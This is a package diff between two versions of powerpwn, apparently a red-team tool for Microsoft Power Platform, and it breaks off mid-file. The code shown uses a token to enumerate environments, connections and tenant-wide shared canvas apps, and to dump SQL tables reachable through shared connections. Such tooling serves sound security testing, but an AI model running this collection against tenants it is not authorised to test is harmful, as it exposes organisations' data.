-from powerpwn.powerdump.collect.models.data_dump_entity import DataDump
-from powerpwn.powerdump.collect.models.data_record_entity import DataRecord, DataRecordWithContext
-from powerpwn.powerdump.collect.models.data_store_entity import DataStore, DataStoreWithContext
-from powerpwn.powerdump.utils.const import ENCODING
-from powerpwn.powerdump.utils.requests_wrapper import consecutive_gets, request_and_verify
-
-
-class SharedSqlConnector(ConnectorBase):
-    def _ping(self, connection_parameters: dict) -> List[DataStore]:
-        data_stores: List[DataStore] = []
-
-        # we dont have server/database for another auth types
-        # if we use the /servers endpoint for other auth types we will get []
-        if not (
-            connection_parameters.get("name", "") in ("sqlAuthentication", "windowsAuthentication")
-            or connection_parameters.get("authType", "") == "windows"
-        ):
-            return data_stores
-
-        is_windows = connection_parameters.get("authType", "") == "windows"
-
-        success, _, _ = request_and_verify(session=self._session, expected_status_prefix="200", method="get", url=f"{self._root}/testconnection")
-
-        if success:
-            data_stores.append(
-                DataStore(
-                    tenant=None,
-                    account="temp",
-                    scope=None,
-                    host=f'https://{connection_parameters["server"]}.database.windows.net'
-                    if is_windows
-                    else f'https://{connection_parameters["values"]["server"]["value"]}',
-                    name=connection_parameters["server"] if is_windows else connection_parameters["values"]["server"]["value"],
-                    extra={},
-                )
-            )
-
-        return data_stores
-
-    def _enum(self, data_store: DataStoreWithContext) -> List[DataRecord]:
-        data_records: List[DataRecord] = []
-
-        can_list_databases, databases_val = consecutive_gets(
-            session=self._session, expected_status_prefix="200", url=f"{self._root}/v2/databases?server={data_store.data_store.name}"
-        )
-        if can_list_databases:
-            for db_obj in databases_val:
-                db_name = db_obj["Name"]
-
-                can_list_tables, tables_val = consecutive_gets(
-                    session=self._session, expected_status_prefix="200", url=f"{self._root}/v2/datasets/{data_store.data_store.name},{db_name}/tables"
-                )
-                if can_list_tables:
-                    for table in tables_val:
-                        table_display_name = table["DisplayName"]
-                        data_records.append(
-                            DataRecord(
-                                record_type=DataDumpType.table,
-                                record_id=table["Name"],
-                                record_name=f"{db_name}-{table_display_name}",
-                                extra={"db_name": db_name},
-                            )
-                        )
-
-        return data_records
-
-    def _dump(self, data_record: DataRecordWithContext) -> DataDump:
-        server_name = data_record.data_store.data_store.name
-        db_name = data_record.data_record.extra["db_name"]
-        success, val = consecutive_gets(
-            session=self._session,
-            expected_status_prefix="200",
-            url=f"{self._root}/v2/datasets/{server_name},{db_name}/tables/{data_record.data_record.record_id}/items",
-        )
-
-        if not success:
-            raise ValueError(
-                f"Unable to fetch value for data type: {data_record.data_record.record_type} with ID: {data_record.data_record.record_id}."
-            )
-
-        table_value = json.dumps(val).encode(ENCODING)
-
-        data_dump = DataDump(extension="json", encoding=ENCODING, content=table_value)
-        return data_dump
-
-    @classmethod
-    def api_name(cls) -> str:
-        return "shared_sql"
-
-    @classmethod
-    def _apim_path(cls) -> str:
-        return "sql"
+import json
+from typing import List
+
+from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.connector_base import ConnectorBase
+from powerpwn.powerdump.collect.data_collectors.enums.data_dump_type import DataDumpType
+from powerpwn.powerdump.collect.models.data_dump_entity import DataDump
+from powerpwn.powerdump.collect.models.data_record_entity import DataRecord, DataRecordWithContext
+from powerpwn.powerdump.collect.models.data_store_entity import DataStore, DataStoreWithContext
+from powerpwn.powerdump.utils.const import ENCODING
+from powerpwn.powerdump.utils.requests_wrapper import consecutive_gets, request_and_verify
+
+
+class SharedSqlConnector(ConnectorBase):
+    def _ping(self, connection_parameters: dict) -> List[DataStore]:
+        data_stores: List[DataStore] = []
+
+        # we dont have server/database for another auth types
+        # if we use the /servers endpoint for other auth types we will get []
+        if not (
+            connection_parameters.get("name", "") in ("sqlAuthentication", "windowsAuthentication")
+            or connection_parameters.get("authType", "") == "windows"
+        ):
+            return data_stores
+
+        is_windows = connection_parameters.get("authType", "") == "windows"
+
+        success, _, _ = request_and_verify(session=self._session, expected_status_prefix="200", method="get", url=f"{self._root}/testconnection")
+
+        if success:
+            data_stores.append(
+                DataStore(
+                    tenant=None,
+                    account="temp",
+                    scope=None,
+                    host=(
+                        f'https://{connection_parameters["server"]}.database.windows.net'
+                        if is_windows
+                        else f'https://{connection_parameters["values"]["server"]["value"]}'
+                    ),
+                    name=connection_parameters["server"] if is_windows else connection_parameters["values"]["server"]["value"],
+                    extra={},
+                )
+            )
+
+        return data_stores
+
+    def _enum(self, data_store: DataStoreWithContext) -> List[DataRecord]:
+        data_records: List[DataRecord] = []
+
+        can_list_databases, databases_val = consecutive_gets(
+            session=self._session, expected_status_prefix="200", url=f"{self._root}/v2/databases?server={data_store.data_store.name}"
+        )
+        if can_list_databases:
+            for db_obj in databases_val:
+                db_name = db_obj["Name"]
+
+                can_list_tables, tables_val = consecutive_gets(
+                    session=self._session, expected_status_prefix="200", url=f"{self._root}/v2/datasets/{data_store.data_store.name},{db_name}/tables"
+                )
+                if can_list_tables:
+                    for table in tables_val:
+                        table_display_name = table["DisplayName"]
+                        data_records.append(
+                            DataRecord(
+                                record_type=DataDumpType.table,
+                                record_id=table["Name"],
+                                record_name=f"{db_name}-{table_display_name}",
+                                extra={"db_name": db_name},
+                            )
+                        )
+
+        return data_records
+
+    def _dump(self, data_record: DataRecordWithContext) -> DataDump:
+        server_name = data_record.data_store.data_store.name
+        db_name = data_record.data_record.extra["db_name"]
+        success, val = consecutive_gets(
+            session=self._session,
+            expected_status_prefix="200",
+            url=f"{self._root}/v2/datasets/{server_name},{db_name}/tables/{data_record.data_record.record_id}/items",
+        )
+
+        if not success:
+            raise ValueError(
+                f"Unable to fetch value for data type: {data_record.data_record.record_type} with ID: {data_record.data_record.record_id}."
+            )
+
+        table_value = json.dumps(val).encode(ENCODING)
+
+        data_dump = DataDump(extension="json", encoding=ENCODING, content=table_value)
+        return data_dump
+
+    @classmethod
+    def api_name(cls) -> str:
+        return "shared_sql"
+
+    @classmethod
+    def _apim_path(cls) -> str:
+        return "sql"
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/data_collector.py` & `powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/data_collector.py`

 * *Ordering differences only*

 * *Files 18% similar despite different names*

```diff
@@ -1,33 +1,33 @@
-import os
-import shutil
-
-from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connections_data_collector import ConnectionsDataCollector
-from powerpwn.powerdump.utils.model_loaders import get_environment_ids
-from powerpwn.powerdump.utils.path_utils import env_collected_data_path
-from powerpwn.powerdump.utils.requests_wrapper import init_session
-
-
-class DataCollector:
-    """
-    A Class to collect data from resources and cache them in provided cache path
-    """
-
-    def __init__(self, cache_path: str, token: str) -> None:
-        self.__cache_path = cache_path
-        self.__session = init_session(token=token)
-        self.__data_collectors = [ConnectionsDataCollector]
-
-    def collect(self) -> bool:
-        environment_ids = get_environment_ids(self.__cache_path)
-        if len(environment_ids) == 0:
-            return False
-
-        for env_id in get_environment_ids(self.__cache_path):
-            env_dumps_root_dir = env_collected_data_path(env_id, self.__cache_path)
-            if os.path.isdir(env_dumps_root_dir):
-                shutil.rmtree(env_dumps_root_dir)
-
-            for data_collector in self.__data_collectors:
-                data_collector_instance = data_collector(self.__cache_path)
-                data_collector_instance.collect(self.__session, env_id, env_dumps_root_dir)
-        return True
+import os
+import shutil
+
+from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connections_data_collector import ConnectionsDataCollector
+from powerpwn.powerdump.utils.model_loaders import get_environment_ids
+from powerpwn.powerdump.utils.path_utils import env_collected_data_path
+from powerpwn.powerdump.utils.requests_wrapper import init_session
+
+
+class DataCollector:
+    """
+    A Class to collect data from resources and cache them in provided cache path
+    """
+
+    def __init__(self, cache_path: str, token: str) -> None:
+        self.__cache_path = cache_path
+        self.__session = init_session(token=token)
+        self.__data_collectors = [ConnectionsDataCollector]
+
+    def collect(self) -> bool:
+        environment_ids = get_environment_ids(self.__cache_path)
+        if len(environment_ids) == 0:
+            return False
+
+        for env_id in get_environment_ids(self.__cache_path):
+            env_dumps_root_dir = env_collected_data_path(env_id, self.__cache_path)
+            if os.path.isdir(env_dumps_root_dir):
+                shutil.rmtree(env_dumps_root_dir)
+
+            for data_collector in self.__data_collectors:
+                data_collector_instance = data_collector(self.__cache_path)
+                data_collector_instance.collect(self.__session, env_id, env_dumps_root_dir)
+        return True
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerdump/collect/models/base_entity.py` & `powerpwn-2.1.5/src/powerpwn/powerdump/collect/models/base_entity.py`

 * *Ordering differences only*

 * *Files 25% similar despite different names*

```diff
@@ -1,22 +1,22 @@
-from typing import Any
-
-from pydantic import BaseModel, Field, validator
-
-from powerpwn.powerdump.collect.models.base_validator import BaseEntityValidator
-from powerpwn.powerdump.utils.const import DATA_MODEL_VERSION
-
-
-# noinspection PyRedeclaration
-class BaseEntity(BaseModel):
-    data_model_version: str = Field(title="Data model version", default=DATA_MODEL_VERSION)
-
-    validate_data_model_version: Any = validator("data_model_version", allow_reuse=True)(BaseEntityValidator.validate_data_model_version)
-
-    class Config:
-        """
-        this config tells pydantic BaseModel to use enum values
-        when converting to dict() instead of enum
-        """
-
-        validate_assignment = True
-        use_enum_values = True
+from typing import Any
+
+from pydantic import BaseModel, Field, validator
+
+from powerpwn.powerdump.collect.models.base_validator import BaseEntityValidator
+from powerpwn.powerdump.utils.const import DATA_MODEL_VERSION
+
+
+# noinspection PyRedeclaration
+class BaseEntity(BaseModel):
+    data_model_version: str = Field(title="Data model version", default=DATA_MODEL_VERSION)
+
+    validate_data_model_version: Any = validator("data_model_version", allow_reuse=True)(BaseEntityValidator.validate_data_model_version)
+
+    class Config:
+        """
+        this config tells pydantic BaseModel to use enum values
+        when converting to dict() instead of enum
+        """
+
+        validate_assignment = True
+        use_enum_values = True
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerdump/collect/models/connection_entity.py` & `powerpwn-2.1.5/src/powerpwn/powerdump/collect/models/connection_entity.py`

 * *Ordering differences only*

 * *Files 8% similar despite different names*

```diff
@@ -1,34 +1,34 @@
-from datetime import datetime
-from typing import Dict, Optional
-
-from pydantic import Field, HttpUrl
-
-from powerpwn.powerdump.collect.models.principal_entity import Principal
-from powerpwn.powerdump.collect.models.resource_entity_base import ResourceEntityBase
-
-
-class Connection(ResourceEntityBase):
-    connection_id: str = Field(..., title="Connection ID")
-
-    is_valid: bool = Field(..., title="Has no error indicators")
-    shareable: bool = Field(..., title="Is connection shareable")
-
-    connector_id: str = Field(..., title="Connector ID")
-    api_id: str = Field(..., title="API ID")
-    icon_uri: HttpUrl = Field(..., title="Icon URI")
-
-    environment_id: str = Field(..., title="Environment ID")
-    environment_name: str = Field(..., title="Environment Name")
-
-    created_at: datetime = Field(title="Created time")
-    last_modified_at: datetime = Field(title="Last modified time")
-    expiration_time: Optional[datetime] = Field(title="Expiration time")
-
-    created_by: Principal = Field(..., title="Created by")
-
-    connection_parameters: Dict = Field(..., title="Connection parameters")
-    test_uri: Optional[HttpUrl] = Field(..., title="Test URI")
-
-    @property
-    def api_name(self) -> str:
-        return self.api_id.split("/")[-1]
+from datetime import datetime
+from typing import Dict, Optional
+
+from pydantic import Field, HttpUrl
+
+from powerpwn.powerdump.collect.models.principal_entity import Principal
+from powerpwn.powerdump.collect.models.resource_entity_base import ResourceEntityBase
+
+
+class Connection(ResourceEntityBase):
+    connection_id: str = Field(..., title="Connection ID")
+
+    is_valid: bool = Field(..., title="Has no error indicators")
+    shareable: bool = Field(..., title="Is connection shareable")
+
+    connector_id: str = Field(..., title="Connector ID")
+    api_id: str = Field(..., title="API ID")
+    icon_uri: HttpUrl = Field(..., title="Icon URI")
+
+    environment_id: str = Field(..., title="Environment ID")
+    environment_name: str = Field(..., title="Environment Name")
+
+    created_at: datetime = Field(title="Created time")
+    last_modified_at: datetime = Field(title="Last modified time")
+    expiration_time: Optional[datetime] = Field(title="Expiration time")
+
+    created_by: Principal = Field(..., title="Created by")
+
+    connection_parameters: Dict = Field(..., title="Connection parameters")
+    test_uri: Optional[HttpUrl] = Field(..., title="Test URI")
+
+    @property
+    def api_name(self) -> str:
+        return self.api_id.split("/")[-1]
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerdump/collect/models/connector_entity.py` & `powerpwn-2.1.5/src/powerpwn/powerdump/collect/models/connector_entity.py`

 * *Ordering differences only*

 * *Files 16% similar despite different names*

```diff
@@ -1,55 +1,55 @@
-import json
-from copy import deepcopy
-from datetime import datetime
-from typing import Dict
-
-import prance
-from pydantic import Field
-
-from powerpwn.powerdump.collect.models.resource_entity_base import ResourceEntityBase
-from powerpwn.powerdump.utils.json_utils import change_obj_recu
-
-
-class Connector(ResourceEntityBase):
-    api_name: str = Field(..., title="API Name")
-
-    environment_id: str = Field(..., title="Environment ID")
-
-    swagger: Dict = Field(..., title="OpenAPI spec")
-
-    created_at: datetime = Field(..., title="Creation time")
-
-    last_modified_at: datetime = Field(..., title="Last modified time")
-
-    created_by: str = Field(..., title="Created by")
-
-    version: str = Field(..., title="Connector version")
-
-    def processed_swagger(self, connection_id: str, make_concrete: bool = False) -> Dict:
-        # avoid side effects
-        swagger_instance = deepcopy(self.swagger)
-
-        # clean connectionId from path
-        swagger_instance["paths"] = {k.replace("{connectionId}", connection_id): v for k, v in swagger_instance.get("paths", {}).items()}
-
-        if make_concrete:
-            # resolve references
-            parser = prance.ResolvingParser(spec_string=json.dumps(swagger_instance))
-            parsed_swagger = parser.specification
-
-            # ensure examples are generate with rich schemas
-            def _arrays_should_have_min_items(_val: Dict):
-                if _val.get("type") == "array":
-                    _val["minItems"] = 1
-
-            change_obj_recu(val=parsed_swagger, obj_changer=_arrays_should_have_min_items)
-
-            def _objects_should_have_all_properties(_val: Dict):
-                if _val.get("type") == "object" and "required" not in _val:
-                    _val["required"] = list(_val.get("properties", {}).keys())
-
-            change_obj_recu(val=parsed_swagger, obj_changer=_objects_should_have_all_properties)
-        else:
-            parsed_swagger = swagger_instance
-
-        return parsed_swagger
+import json
+from copy import deepcopy
+from datetime import datetime
+from typing import Dict
+
+import prance
+from pydantic import Field
+
+from powerpwn.powerdump.collect.models.resource_entity_base import ResourceEntityBase
+from powerpwn.powerdump.utils.json_utils import change_obj_recu
+
+
+class Connector(ResourceEntityBase):
+    api_name: str = Field(..., title="API Name")
+
+    environment_id: str = Field(..., title="Environment ID")
+
+    swagger: Dict = Field(..., title="OpenAPI spec")
+
+    created_at: datetime = Field(..., title="Creation time")
+
+    last_modified_at: datetime = Field(..., title="Last modified time")
+
+    created_by: str = Field(..., title="Created by")
+
+    version: str = Field(..., title="Connector version")
+
+    def processed_swagger(self, connection_id: str, make_concrete: bool = False) -> Dict:
+        # avoid side effects
+        swagger_instance = deepcopy(self.swagger)
+
+        # clean connectionId from path
+        swagger_instance["paths"] = {k.replace("{connectionId}", connection_id): v for k, v in swagger_instance.get("paths", {}).items()}
+
+        if make_concrete:
+            # resolve references
+            parser = prance.ResolvingParser(spec_string=json.dumps(swagger_instance))
+            parsed_swagger = parser.specification
+
+            # ensure examples are generate with rich schemas
+            def _arrays_should_have_min_items(_val: Dict):
+                if _val.get("type") == "array":
+                    _val["minItems"] = 1
+
+            change_obj_recu(val=parsed_swagger, obj_changer=_arrays_should_have_min_items)
+
+            def _objects_should_have_all_properties(_val: Dict):
+                if _val.get("type") == "object" and "required" not in _val:
+                    _val["required"] = list(_val.get("properties", {}).keys())
+
+            change_obj_recu(val=parsed_swagger, obj_changer=_objects_should_have_all_properties)
+        else:
+            parsed_swagger = swagger_instance
+
+        return parsed_swagger
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerdump/collect/models/data_dump_entity.py` & `powerpwn-2.1.5/src/powerpwn/powerdump/collect/models/data_dump_entity.py`

 * *Ordering differences only*

 * *Files 16% similar despite different names*

```diff
@@ -1,18 +1,18 @@
-from typing import Optional
-
-from pydantic import Field
-
-from powerpwn.powerdump.collect.models.base_entity import BaseEntity
-from powerpwn.powerdump.collect.models.data_record_entity import DataRecordWithContext
-from powerpwn.powerdump.utils.const import ENCODING
-
-
-class DataDump(BaseEntity):
-    extension: str = Field(..., title="File extension")
-    encoding: Optional[str] = Field(title="Text encoding", default=ENCODING)
-    content: bytes = Field(..., title="Content in bytes")
-
-
-class DataDumpWithContext(BaseEntity):
-    data_record: DataRecordWithContext = Field(..., title="Data record")
-    data_dump: DataDump = Field(..., title="Data Dump")
+from typing import Optional
+
+from pydantic import Field
+
+from powerpwn.powerdump.collect.models.base_entity import BaseEntity
+from powerpwn.powerdump.collect.models.data_record_entity import DataRecordWithContext
+from powerpwn.powerdump.utils.const import ENCODING
+
+
+class DataDump(BaseEntity):
+    extension: str = Field(..., title="File extension")
+    encoding: Optional[str] = Field(title="Text encoding", default=ENCODING)
+    content: bytes = Field(..., title="Content in bytes")
+
+
+class DataDumpWithContext(BaseEntity):
+    data_record: DataRecordWithContext = Field(..., title="Data record")
+    data_dump: DataDump = Field(..., title="Data Dump")
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerdump/collect/models/data_record_entity.py` & `powerpwn-2.1.5/src/powerpwn/powerdump/collect/models/data_record_entity.py`

 * *Ordering differences only*

 * *Files 26% similar despite different names*

```diff
@@ -1,19 +1,19 @@
-from typing import Dict, Optional
-
-from pydantic import Field
-
-from powerpwn.powerdump.collect.data_collectors.enums.data_dump_type import DataDumpType
-from powerpwn.powerdump.collect.models.base_entity import BaseEntity
-from powerpwn.powerdump.collect.models.data_store_entity import DataStoreWithContext
-
-
-class DataRecord(BaseEntity):
-    record_type: DataDumpType = Field(..., title="Record type")
-    record_id: str = Field(..., title="Record ID")
-    record_name: Optional[str] = Field(..., title="Record display name")
-    extra: Dict = Field(..., title="Additional information")
-
-
-class DataRecordWithContext(BaseEntity):
-    data_store: DataStoreWithContext = Field(..., title="Data Store")
-    data_record: DataRecord = Field(..., title="Data Record")
+from typing import Dict, Optional
+
+from pydantic import Field
+
+from powerpwn.powerdump.collect.data_collectors.enums.data_dump_type import DataDumpType
+from powerpwn.powerdump.collect.models.base_entity import BaseEntity
+from powerpwn.powerdump.collect.models.data_store_entity import DataStoreWithContext
+
+
+class DataRecord(BaseEntity):
+    record_type: DataDumpType = Field(..., title="Record type")
+    record_id: str = Field(..., title="Record ID")
+    record_name: Optional[str] = Field(..., title="Record display name")
+    extra: Dict = Field(..., title="Additional information")
+
+
+class DataRecordWithContext(BaseEntity):
+    data_store: DataStoreWithContext = Field(..., title="Data Store")
+    data_record: DataRecord = Field(..., title="Data Record")
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerdump/collect/resources_collectors/_api.py` & `powerpwn-2.1.5/src/powerpwn/powerdump/collect/resources_collectors/_api.py`

 * *Ordering differences only*

 * *Files 11% similar despite different names*

```diff
@@ -1,82 +1,82 @@
-from typing import Any, Dict, Generator, List, Optional
-
-import requests
-
-
-def list_connectors(session: requests.Session, environment_id: str) -> Generator[Dict[str, Any], None, None]:
-    yield from __paginate(
-        session,
-        "https://api.powerapps.com/providers/Microsoft.PowerApps/apis",
-        {"api-version": "2016-11-01", "$filter": f"environment eq '{environment_id}'"},
-        f"get_connectors(environment_id={environment_id})",
-    )
-
-
-def get_connector(session: requests.Session, environment_id: str, connector_id: str):
-    resp = session.get(
-        url=f"https://api.powerapps.com/providers/Microsoft.PowerApps/apis/{connector_id}",
-        params={"api-version": "2016-11-01", "$filter": f"environment eq '{environment_id}'"},
-    )
-    if resp.status_code != 200:
-        raise RuntimeError(
-            f"Got status code {resp.status_code} for get_connector(environment_id={environment_id}, connector_name={connector_id}): {str(resp.content)}."
-        )
-    return resp.json()
-
-
-def list_connections(session: requests.Session, environment_id: str) -> Generator[Dict[str, Any], None, None]:
-    yield from __paginate(
-        session,
-        "https://api.powerapps.com/providers/Microsoft.PowerApps/connections",
-        {"api-version": "2016-11-01", "$filter": f"environment eq '{environment_id}'"},
-        f"list_connections(environment_id={environment_id})",
-    )
-
-
-def list_canvas_apps(session: requests.Session, environment_id: str) -> Generator[Dict[str, Any], None, None]:
-    yield from __paginate(
-        session,
-        "https://api.powerapps.com/providers/Microsoft.PowerApps/apps",
-        {"api-version": "2016-11-01", "$filter": f"environment eq '{environment_id}'"},
-        f"list_canvas_apps(environment_id={environment_id})",
-    )
-
-
-def list_canvas_app_rbac(session: requests.Session, app_id: str, environment_id: str) -> Generator[Dict[str, Any], None, None]:
-    yield from __paginate(
-        session,
-        f"https://api.powerapps.com/providers/Microsoft.PowerApps/apps/{app_id}/permissions",
-        {"api-version": "2016-11-01", "$filter": f"environment eq '{environment_id}'"},
-        f"list_canvas_app_rbac(environment_id={environment_id})",
-    )
-
-
-def list_environments(session: requests.Session) -> List[str]:
-    resp = session.get(url="https://api.powerapps.com/providers/Microsoft.PowerApps/environments", params={"api-version": "2016-11-01"})
-    if resp.status_code != 200:
-        raise RuntimeError(f"Got status code {resp.status_code} for list_environments: {str(resp.content)}.")
-
-    environment_ids = [environment_obj["name"] for environment_obj in resp.json()["value"]]
-    return environment_ids
-
-
-def __paginate(
-    session: requests.Session, url: str, params: Dict[str, str], endpoint: str, next_link: Optional[str] = None
-) -> Generator[Dict[str, Any], None, None]:
-    params_to_query = params
-    url_to_query = url
-
-    if next_link:
-        params_to_query = {}
-        url_to_query = next_link
-
-    resp = session.get(url=url_to_query, params=params_to_query)
-    if resp.status_code != 200:
-        raise RuntimeError(f"Got status code {resp.status_code} for {endpoint}: {str(resp.content)}.")
-
-    res = resp.json()
-
-    yield from res["value"]
-
-    if "nextLink" in res:
-        yield from __paginate(session, url, params, endpoint, res["nextLink"])
+from typing import Any, Dict, Generator, List, Optional
+
+import requests
+
+
+def list_connectors(session: requests.Session, environment_id: str) -> Generator[Dict[str, Any], None, None]:
+    yield from __paginate(
+        session,
+        "https://api.powerapps.com/providers/Microsoft.PowerApps/apis",
+        {"api-version": "2016-11-01", "$filter": f"environment eq '{environment_id}'"},
+        f"get_connectors(environment_id={environment_id})",
+    )
+
+
+def get_connector(session: requests.Session, environment_id: str, connector_id: str):
+    resp = session.get(
+        url=f"https://api.powerapps.com/providers/Microsoft.PowerApps/apis/{connector_id}",
+        params={"api-version": "2016-11-01", "$filter": f"environment eq '{environment_id}'"},
+    )
+    if resp.status_code != 200:
+        raise RuntimeError(
+            f"Got status code {resp.status_code} for get_connector(environment_id={environment_id}, connector_name={connector_id}): {str(resp.content)}."
+        )
+    return resp.json()
+
+
+def list_connections(session: requests.Session, environment_id: str) -> Generator[Dict[str, Any], None, None]:
+    yield from __paginate(
+        session,
+        "https://api.powerapps.com/providers/Microsoft.PowerApps/connections",
+        {"api-version": "2016-11-01", "$filter": f"environment eq '{environment_id}'"},
+        f"list_connections(environment_id={environment_id})",
+    )
+
+
+def list_canvas_apps(session: requests.Session, environment_id: str) -> Generator[Dict[str, Any], None, None]:
+    yield from __paginate(
+        session,
+        "https://api.powerapps.com/providers/Microsoft.PowerApps/apps",
+        {"api-version": "2016-11-01", "$filter": f"environment eq '{environment_id}'"},
+        f"list_canvas_apps(environment_id={environment_id})",
+    )
+
+
+def list_canvas_app_rbac(session: requests.Session, app_id: str, environment_id: str) -> Generator[Dict[str, Any], None, None]:
+    yield from __paginate(
+        session,
+        f"https://api.powerapps.com/providers/Microsoft.PowerApps/apps/{app_id}/permissions",
+        {"api-version": "2016-11-01", "$filter": f"environment eq '{environment_id}'"},
+        f"list_canvas_app_rbac(environment_id={environment_id})",
+    )
+
+
+def list_environments(session: requests.Session) -> List[str]:
+    resp = session.get(url="https://api.powerapps.com/providers/Microsoft.PowerApps/environments", params={"api-version": "2016-11-01"})
+    if resp.status_code != 200:
+        raise RuntimeError(f"Got status code {resp.status_code} for list_environments: {str(resp.content)}.")
+
+    environment_ids = [environment_obj["name"] for environment_obj in resp.json()["value"]]
+    return environment_ids
+
+
+def __paginate(
+    session: requests.Session, url: str, params: Dict[str, str], endpoint: str, next_link: Optional[str] = None
+) -> Generator[Dict[str, Any], None, None]:
+    params_to_query = params
+    url_to_query = url
+
+    if next_link:
+        params_to_query = {}
+        url_to_query = next_link
+
+    resp = session.get(url=url_to_query, params=params_to_query)
+    if resp.status_code != 200:
+        raise RuntimeError(f"Got status code {resp.status_code} for {endpoint}: {str(resp.content)}.")
+
+    res = resp.json()
+
+    yield from res["value"]
+
+    if "nextLink" in res:
+        yield from __paginate(session, url, params, endpoint, res["nextLink"])
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerdump/collect/resources_collectors/canvas_apps_collector.py` & `powerpwn-2.1.5/src/powerpwn/powerdump/collect/resources_collectors/canvas_apps_collector.py`

 * *Ordering differences only*

 * *Files 9% similar despite different names*

```diff
@@ -1,88 +1,88 @@
-import logging
-from typing import Generator
-
-import requests
-
-from powerpwn.cli.const import LOGGER_NAME
-from powerpwn.powerdump.collect.models.canvas_app_entity import CanvasApp
-from powerpwn.powerdump.collect.models.principal_entity import Principal
-from powerpwn.powerdump.collect.resources_collectors._api import list_canvas_app_rbac, list_canvas_apps
-from powerpwn.powerdump.collect.resources_collectors.enums.resource_type import ResourceType
-from powerpwn.powerdump.collect.resources_collectors.iresource_collector import IResourceCollector
-
-logger = logging.getLogger(LOGGER_NAME)
-
-
-class CanvasAppsCollector(IResourceCollector):
-    def collect(self, session: requests.Session, environment_id: str) -> Generator[CanvasApp, None, None]:
-        total_canvas_apps = 0
-        total_widely_shared_canvas_apps = 0
-        for canvas_app in list_canvas_apps(session, environment_id):
-            total_canvas_apps += 1
-            rbacs = list(list_canvas_app_rbac(session, canvas_app["name"], environment_id))
-            if any(rbac.get("properties", {}).get("principal", {}).get("type", "NOT_TENANT") == "Tenant" for rbac in rbacs):
-                total_widely_shared_canvas_apps += 1
-                principals = []
-                for rbac in rbacs:
-                    if rbac["properties"]["principal"]["type"] == "Tenant":
-                        principals.append(
-                            Principal(
-                                entity_type=ResourceType.principal,
-                                entity_id=rbac["properties"]["principal"].get("tenantId"),
-                                principal_id=rbac["properties"]["principal"].get("tenantId"),
-                                type=rbac["properties"]["principal"].get("type"),
-                                tenant_id=rbac["properties"]["principal"].get("tenantId"),
-                                raw_json=rbac,
-                                display_name=rbac["properties"]["principal"].get("tenantId"),
-                            )
-                        )
-                    else:
-                        principals.append(
-                            Principal(
-                                entity_type=ResourceType.principal,
-                                entity_id=rbac["properties"]["principal"].get("id"),
-                                principal_id=rbac["properties"]["principal"].get("id"),
-                                type=rbac["properties"]["principal"].get("type"),
-                                tenant_id=rbac["properties"]["principal"].get("tenantId", "N/A"),
-                                display_name=rbac["properties"]["principal"].get("displayName"),
-                                email=rbac["properties"]["principal"].get("email"),
-                                upn=rbac["properties"]["principal"].get("email"),
-                                raw_json=rbac,
-                            )
-                        )
-
-                created_by = Principal(
-                    entity_type=ResourceType.principal,
-                    entity_id=canvas_app["properties"]["createdBy"].get("id"),
-                    principal_id=canvas_app["properties"]["createdBy"].get("id"),
-                    type=canvas_app["properties"]["createdBy"].get("type"),
-                    tenant_id=canvas_app["properties"]["createdBy"].get("tenantId", "N/A"),
-                    display_name=canvas_app["properties"]["createdBy"].get("displayName"),
-                    email=canvas_app["properties"]["createdBy"].get("email"),
-                    upn=canvas_app["properties"]["createdBy"].get("userPrincipalName"),
-                    raw_json=canvas_app["properties"]["createdBy"],
-                )
-
-                run_url = canvas_app["properties"]["appPlayUri"]
-                version = canvas_app["properties"]["appVersion"]
-                environment_id = canvas_app["properties"]["environment"]["name"].replace("default", "Default")
-
-                yield CanvasApp(
-                    raw_json=canvas_app,
-                    display_name=canvas_app["properties"]["displayName"],
-                    created_by=created_by,
-                    created_at=canvas_app["properties"]["createdTime"],
-                    last_modified_at=canvas_app["properties"]["lastModifiedTime"],
-                    run_url=run_url,
-                    version=version,
-                    permissions=principals,
-                    entity_id=canvas_app["name"],
-                    environment_id=environment_id,
-                    entity_type=ResourceType.canvas_app,
-                )
-        logger.info(
-            f"Found {total_widely_shared_canvas_apps} widely shared applications out of {total_canvas_apps} canvas apps in environment {environment_id}"
-        )
-
-    def resource_type(self) -> ResourceType:
-        return ResourceType.canvas_app
+import logging
+from typing import Generator
+
+import requests
+
+from powerpwn.cli.const import LOGGER_NAME
+from powerpwn.powerdump.collect.models.canvas_app_entity import CanvasApp
+from powerpwn.powerdump.collect.models.principal_entity import Principal
+from powerpwn.powerdump.collect.resources_collectors._api import list_canvas_app_rbac, list_canvas_apps
+from powerpwn.powerdump.collect.resources_collectors.enums.resource_type import ResourceType
+from powerpwn.powerdump.collect.resources_collectors.iresource_collector import IResourceCollector
+
+logger = logging.getLogger(LOGGER_NAME)
+
+
+class CanvasAppsCollector(IResourceCollector):
+    def collect(self, session: requests.Session, environment_id: str) -> Generator[CanvasApp, None, None]:
+        total_canvas_apps = 0
+        total_widely_shared_canvas_apps = 0
+        for canvas_app in list_canvas_apps(session, environment_id):
+            total_canvas_apps += 1
+            rbacs = list(list_canvas_app_rbac(session, canvas_app["name"], environment_id))
+            if any(rbac.get("properties", {}).get("principal", {}).get("type", "NOT_TENANT") == "Tenant" for rbac in rbacs):
+                total_widely_shared_canvas_apps += 1
+                principals = []
+                for rbac in rbacs:
+                    if rbac["properties"]["principal"]["type"] == "Tenant":
+                        principals.append(
+                            Principal(
+                                entity_type=ResourceType.principal,
+                                entity_id=rbac["properties"]["principal"].get("tenantId"),
+                                principal_id=rbac["properties"]["principal"].get("tenantId"),
+                                type=rbac["properties"]["principal"].get("type"),
+                                tenant_id=rbac["properties"]["principal"].get("tenantId"),
+                                raw_json=rbac,
+                                display_name=rbac["properties"]["principal"].get("tenantId"),
+                            )
+                        )
+                    else:
+                        principals.append(
+                            Principal(
+                                entity_type=ResourceType.principal,
+                                entity_id=rbac["properties"]["principal"].get("id"),
+                                principal_id=rbac["properties"]["principal"].get("id"),
